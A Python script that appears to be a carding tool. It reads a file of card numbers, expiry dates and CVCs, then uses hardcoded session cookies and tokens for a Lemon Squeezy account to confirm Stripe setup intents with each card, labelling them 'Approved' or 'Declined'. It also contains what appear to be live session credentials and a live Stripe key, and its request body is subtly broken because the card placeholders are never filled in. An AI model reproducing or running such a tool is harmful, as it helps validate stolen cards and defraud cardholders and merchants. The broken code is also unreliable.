try:
 import pyfiglet,requests
 from colorama import Fore
 import colorama
except ModuleNotFoundError:
 os.system('pip install requests')
 os.system('pip install pyfiglet')
 os.system('clear')

print(Fore.BLUE+"""
[  1️⃣  .Telegram - 𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ . - 𝑨𝒏𝒌𝒂𝒂𝒂𝒔𝒕𝒓𝒐𝒐 𝑩𝒗𝒗𝒗𝒔𝒉𝒗 💎 ‹  ] 
[  2️⃣  .Instagram - 4ec_q   ] 
[  3️⃣  .Tools By @u_3_3_3_3 ]
[  4️⃣  .My Chanal Tele - https://t.me/python_proffetional  ]
[  5️⃣  .My Chanal Tele 2 - https://t.me/modcathelost  ]
[  6️⃣  .𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ . يتمنى لاصحاب فك التشفير ان يصبحو رجالا   ['
""")

file=open('Modca.txt',"+r")
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
k = ("             ♡      ｡ﾟﾟ･｡･ﾟﾟ｡𝗠𝗼𝗱𝗰𝗮 𓏺 𝗧𝗵𝗲 𝗟𝗼𝘀𝘁🇩🇿⃤ . - 𝑨𝒏𝒌𝒂𝒂𝒂𝒔𝒕𝒓𝒐𝒐 𝑩𝒗𝒗𝒗𝒔𝒉𝒗 💎 ‹｡ﾟﾟ･｡･ﾟﾟ｡" )
print(B + k)
print('      ---------------------------------\<>/------------------------------')
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	
	cookies = {
    '_fbp': 'fb.1.1701116908034.952911434',
    'intercom-device-id-goppktf8': '541be6aa-6fc2-4529-9778-1274b5ec51ef',
    '__stripe_mid': 'f7434538-d485-4f8f-a000-82b8443ed0301f421f',
    'remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d': 'eyJpdiI6IjI4OGhWVm02Q3RvMW0yVWJLNkRFYXc9PSIsInZhbHVlIjoiUVNDN2VncldmYWJKSDNvS294N09IWjJmWUpIcklwZ3prbWx4TkMzbytjckR0SU1QT2RRdnltZzB5aWxTbXdsWjMxbTNoeENtNXlsYXZIZzhFUEZEK21iRWg1WGQvWWlETjZ3Vkw2M2kwd2NzVTk2OC8wUTRyempVUVZEV0xoTGZtKzM0R25hUUgvb29VVVdYVjFVZCtZd3FST2E0NjJzRVJTd1NGOTNqdk12c0lBSVZIYjZGYXdoOXFhZmVCU2JYY081YkNwRHNmTm9nQ0h4ejVkN29yWkRUb2VUbFlFMGI0NlFzQnFaR0gwRT0iLCJtYWMiOiJlZmM3YTFhNTMxMDZhNDcwZDQ2Mzk1MzRlZjdkOWQ5YTU3MDFlODI4MTY4MGRlMWQzMzRjOTgyYTlhYzY2YjhiIiwidGFnIjoiIn0%3D',
    'ls_customer': '97c098acc0611bf43f869ff9f62bb8d4',
    '__stripe_sid': '7b8b825e-741a-4664-a7da-37625e913e75bb5d2e',
    'intercom-session-goppktf8': 'QTdqRUhOaDNkS2dlcXoreW8xYUJwakNPT2ZPUGcxL2dPdmJ0SllIZHA5RHc5VUVnNis4M2lmZVJWNUdrSmtGbS0tcG9MaisyaVBlaGN0RGNRamk3UnBLQT09--f1ebeada02d833e1b41a7797a177ecf04fe362d2',
    'laravel_token': 'eyJpdiI6IjAvbVpNVFk1dXlWWFFKcHFsVFZRbEE9PSIsInZhbHVlIjoiU29ZdW9BSzlYSmpFRmt1SVJGalJaVmZna0FiK2ZvOEpKNy9GVmNBUFBUYnFTU0k5c3NzRktkdU10L2UxdlhZRm1TQUMrVitUbU5lcmV6NTlNY01rQWtEMDhxdEZSMURMOXNibm1jdEVQc05GYTlORzEyY0tqRml0VGd5dEs3azl6ZWt6N2pYVmoxUU5QV1h1dXY5SmFrYkhvSElIdWgzbVBPOHZ5TDI3ZHl1REZhQlhIOGl2KzJIMDZmLzhrZWt5YUdGdVd6d2FYT1hJNmJzZEowdzFzN0tiYkh1dXZrbVFCb2JsVE8vL0c5R3R2aHcvYk0yRmNkVWEybjRTcWJvZ3oxY1Y5OS9MNDBxVDdCQ0FKUHVibEdoOW1ueHBVRzcwQjJOZGUxNkJ5WXY3dnhDa0liZWk1QnBPTnNYMWpVUnkiLCJtYWMiOiIzM2MwYzNkZWU5NTNjOWQwNzZkYjQ4YzhiMjlhM2MyZWQxZDM2MTcwMDhlNzU3YjFmODZjZmU4MThhZmFmYWNjIiwidGFnIjoiIn0%3D',
    'XSRF-TOKEN': 'eyJpdiI6IlJ6TWVITTZJS2VHYzduYWp5NDh4Smc9PSIsInZhbHVlIjoicTM0cm00NG53cytIL2h4Y0g4Z3RvbitRbDdGS3lrRlZRSVIyT001MXZEYUN4S1BWanZ2OW9JaUZlOFVBOXh3WGlPRWRsamU3VmwxcDQxL2tWU05hTlZ1NEYvYkFXVGg2ZW9pZGRnNFROZWN6QmdEWGkyOWxuL2ovOE50MmpJT1EiLCJtYWMiOiIxOTI2YmU2ODFjY2RiYjcyZGZiNmEzMDE2NzkyOTY1MGRhZTU0MmYyYWFkMzgzYzk2ZDA5YmIwNzY0YWU1NDE5IiwidGFnIjoiIn0%3D',
    'laravel_session': 'eyJpdiI6Ikw3ZEZ6Nk13NkNkRVFZdW1sU1h0OHc9PSIsInZhbHVlIjoiQ1Bnc1IrTWMxWFZxQ0t4NDl4c01BaTd2SnVKdWMvYzA5c0RSVmF2aDZSZ3JrWFAzalY4NmVjNk1mSEU2cXYyNFJjWDFCV2t5Q0w5bTR4SEZjaWl2dWZzeFU2OXY0MFQ1NTVJOEZhRGlLMGU1UE5PUldzSGQ4SzFDV1k1TXJKWmIiLCJtYWMiOiJjODhmYTI3ZWIxOTVkOTU3ZDllYWIzNTE4ODBlMzc0Zjg4ZTliZmI1NGI1ZTczYjg4N2EyM2I4YTdiNTI0MDUyIiwidGFnIjoiIn0%3D',
}

	headers = {
    'authority': 'app.lemonsqueezy.com',
    'accept': 'text/html, application/xhtml+xml',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_fbp=fb.1.1701116908034.952911434; intercom-device-id-goppktf8=541be6aa-6fc2-4529-9778-1274b5ec51ef; __stripe_mid=f7434538-d485-4f8f-a000-82b8443ed0301f421f; remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IjI4OGhWVm02Q3RvMW0yVWJLNkRFYXc9PSIsInZhbHVlIjoiUVNDN2VncldmYWJKSDNvS294N09IWjJmWUpIcklwZ3prbWx4TkMzbytjckR0SU1QT2RRdnltZzB5aWxTbXdsWjMxbTNoeENtNXlsYXZIZzhFUEZEK21iRWg1WGQvWWlETjZ3Vkw2M2kwd2NzVTk2OC8wUTRyempVUVZEV0xoTGZtKzM0R25hUUgvb29VVVdYVjFVZCtZd3FST2E0NjJzRVJTd1NGOTNqdk12c0lBSVZIYjZGYXdoOXFhZmVCU2JYY081YkNwRHNmTm9nQ0h4ejVkN29yWkRUb2VUbFlFMGI0NlFzQnFaR0gwRT0iLCJtYWMiOiJlZmM3YTFhNTMxMDZhNDcwZDQ2Mzk1MzRlZjdkOWQ5YTU3MDFlODI4MTY4MGRlMWQzMzRjOTgyYTlhYzY2YjhiIiwidGFnIjoiIn0%3D; ls_customer=97c098acc0611bf43f869ff9f62bb8d4; __stripe_sid=7b8b825e-741a-4664-a7da-37625e913e75bb5d2e; intercom-session-goppktf8=QTdqRUhOaDNkS2dlcXoreW8xYUJwakNPT2ZPUGcxL2dPdmJ0SllIZHA5RHc5VUVnNis4M2lmZVJWNUdrSmtGbS0tcG9MaisyaVBlaGN0RGNRamk3UnBLQT09--f1ebeada02d833e1b41a7797a177ecf04fe362d2; laravel_token=eyJpdiI6IjAvbVpNVFk1dXlWWFFKcHFsVFZRbEE9PSIsInZhbHVlIjoiU29ZdW9BSzlYSmpFRmt1SVJGalJaVmZna0FiK2ZvOEpKNy9GVmNBUFBUYnFTU0k5c3NzRktkdU10L2UxdlhZRm1TQUMrVitUbU5lcmV6NTlNY01rQWtEMDhxdEZSMURMOXNibm1jdEVQc05GYTlORzEyY0tqRml0VGd5dEs3azl6ZWt6N2pYVmoxUU5QV1h1dXY5SmFrYkhvSElIdWgzbVBPOHZ5TDI3ZHl1REZhQlhIOGl2KzJIMDZmLzhrZWt5YUdGdVd6d2FYT1hJNmJzZEowdzFzN0tiYkh1dXZrbVFCb2JsVE8vL0c5R3R2aHcvYk0yRmNkVWEybjRTcWJvZ3oxY1Y5OS9MNDBxVDdCQ0FKUHVibEdoOW1ueHBVRzcwQjJOZGUxNkJ5WXY3dnhDa0liZWk1QnBPTnNYMWpVUnkiLCJtYWMiOiIzM2MwYzNkZWU5NTNjOWQwNzZkYjQ4YzhiMjlhM2MyZWQxZDM2MTcwMDhlNzU3YjFmODZjZmU4MThhZmFmYWNjIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IlJ6TWVITTZJS2VHYzduYWp5NDh4Smc9PSIsInZhbHVlIjoicTM0cm00NG53cytIL2h4Y0g4Z3RvbitRbDdGS3lrRlZRSVIyT001MXZEYUN4S1BWanZ2OW9JaUZlOFVBOXh3WGlPRWRsamU3VmwxcDQxL2tWU05hTlZ1NEYvYkFXVGg2ZW9pZGRnNFROZWN6QmdEWGkyOWxuL2ovOE50MmpJT1EiLCJtYWMiOiIxOTI2YmU2ODFjY2RiYjcyZGZiNmEzMDE2NzkyOTY1MGRhZTU0MmYyYWFkMzgzYzk2ZDA5YmIwNzY0YWU1NDE5IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ikw3ZEZ6Nk13NkNkRVFZdW1sU1h0OHc9PSIsInZhbHVlIjoiQ1Bnc1IrTWMxWFZxQ0t4NDl4c01BaTd2SnVKdWMvYzA5c0RSVmF2aDZSZ3JrWFAzalY4NmVjNk1mSEU2cXYyNFJjWDFCV2t5Q0w5bTR4SEZjaWl2dWZzeFU2OXY0MFQ1NTVJOEZhRGlLMGU1UE5PUldzSGQ4SzFDV1k1TXJKWmIiLCJtYWMiOiJjODhmYTI3ZWIxOTVkOTU3ZDllYWIzNTE4ODBlMzc0Zjg4ZTliZmI1NGI1ZTczYjg4N2EyM2I4YTdiNTI0MDUyIiwidGFnIjoiIn0%3D',
    'referer': 'https://app.lemonsqueezy.com/store/billing/card',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-inertia': 'true',
    'x-inertia-version': '67aecc12adb3a113863233314a637129',
    'x-requested-with': 'XMLHttpRequest',
    'x-xsrf-token': 'eyJpdiI6IlVveVE0OHFWZEtySDA2VjVIN0VWeEE9PSIsInZhbHVlIjoiN0FMdmdLWXdweFdCQzRPWTF5bUhkOGFWbFJXcGpFZHpJSlFteXhUekdHSDV0VG1pYzNZeVhQaU9TSml1WE5pOW9HM1lvdy9qK2Y4RUsxUlRmT3ZMZnZZclV2dVlnbkhTSUlxanR5S3BzYTJlOWJiakdXYko1eTRCejZrVHNxcm4iLCJtYWMiOiJlYjUzNTBmNjJjMzE3OTA4ZjE5OTU4MmY3YWU5ODBmOWJlOGI5N2UyNTNhNTVkYjUwMzhlYzY2NTBhMzE3MmE0IiwidGFnIjoiIn0=',
}

	r1 = requests.get('https://app.lemonsqueezy.com/store/billing/card', cookies=cookies, headers=headers)
	st=(r1.json()['props']['panelData']['props']['clientSecret'])
	st1=st.split('_secret_')[0]
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
	data = 'payment_method_data[type]=card&payment_method_data[billing_details][name]=Ahmadsider+&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=10010&payment_method_data[billing_details][address][state]=New+York+&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=b14f1167-e9f3-4254-a6ed-eb5b33d91dc852cea4&payment_method_data[muid]=f7434538-d485-4f8f-a000-82b8443ed0301f421f&payment_method_data[sid]=7b8b825e-741a-4664-a7da-37625e913e75bb5d2e&payment_method_data[payment_user_agent]=stripe.js%2Fe57715257d%3B+stripe-js-v3%2Fe57715257d%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fapp.lemonsqueezy.com&payment_method_data[time_on_page]=313223&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51Jgu2GICFkNQwM9ZSNKmpL4LyG7eqTfnQL60AqyiHXUQP3t03hJVP9bDXc0kTP0RruExau1inV6y5Uic5y9Wz1Xt00onuNBgn3&client_secret={st}'

	r2 = requests.post(
    f'https://api.stripe.com/v1/setup_intents/{st1}/confirm',
    headers=headers,
    data=data,
)
	if "succeeded" in r2.text:
		print(F+f'[ {start_num} ]',P,' ➜ Approved ✅')
	elif "insufficient funds" in r2.text:
		print(F+f'[ {start_num} ]',P,' ➜ Approved ✅(CVV LIVE)')
	elif "security code is incorrect" in r2.text or "ZIP INCORRECT" in r2.text:
		print(F+f'[ {start_num} ]',P,' ➜ Approved ✅(CCN LIVE)')
	else:
		print(Z+f'[ {start_num} ]',P,' ➜ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌')	